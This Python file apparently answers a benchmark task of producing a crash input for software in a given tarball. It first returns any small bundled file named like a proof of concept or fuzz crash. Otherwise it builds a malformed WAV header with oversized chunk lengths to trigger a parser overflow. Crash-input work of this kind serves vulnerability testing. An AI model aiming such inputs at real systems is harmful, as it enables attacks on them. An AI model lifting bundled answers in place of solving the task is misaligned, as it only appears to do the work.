import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates = []
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                for member in tar.getmembers():
                    if not member.isfile() or member.size == 0 or member.size > 1000:
                        continue
                    name = member.name.lower()
                    if any(k in name for k in ('poc', 'crash', 'overflow', 'issue', 'bug', 'fuzz', 'sample', 'id_')):
                        f = tar.extractfile(member)
                        if f:
                            candidates.append(f.read())
        except Exception:
            pass

        if candidates:
            candidates.sort(key=len)
            return candidates[0]

        buf = bytearray()
        buf += b'RIFF'
        buf += (0xFFFFFFFF).to_bytes(4, 'little')
        buf += b'WAVE'
        buf += b'fmt '
        buf += (16).to_bytes(4, 'little')
        buf += (1).to_bytes(2, 'little')   # AudioFormat
        buf += (1).to_bytes(2, 'little')   # NumChannels
        buf += (44100).to_bytes(4, 'little')  # SampleRate
        buf += (0).to_bytes(4, 'little')   # ByteRate
        buf += (0).to_bytes(2, 'little')   # BlockAlign
        buf += (16).to_bytes(2, 'little')  # BitsPerSample
        buf += b'data'
        buf += (0xFFFFFFFF).to_bytes(4, 'little')
        buf += b'\x00' * 14  # Padding to reach 58 bytes
        return bytes(buf)
